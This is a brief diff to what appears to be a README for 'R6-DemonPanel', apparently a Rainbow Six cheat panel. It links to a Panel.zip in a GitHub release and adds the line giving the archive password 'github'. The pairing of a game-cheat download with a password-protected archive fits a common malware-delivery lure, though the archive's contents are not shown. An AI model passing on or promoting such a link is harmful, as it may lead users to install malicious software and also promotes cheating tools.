@@ -1,4 +1,5 @@
 # [Download](https://github.com/aildelohellcar668/R6-DemonPanel/releases/download/Download/Panel.zip)
+# password: github
 
 ![1](https://github.com/aildelohellcar668/R6-DemonPanel/releases/download/Download/340600492-8e0f702a-a73f-4448-99cd-4289b2d4e3eb.png)
 
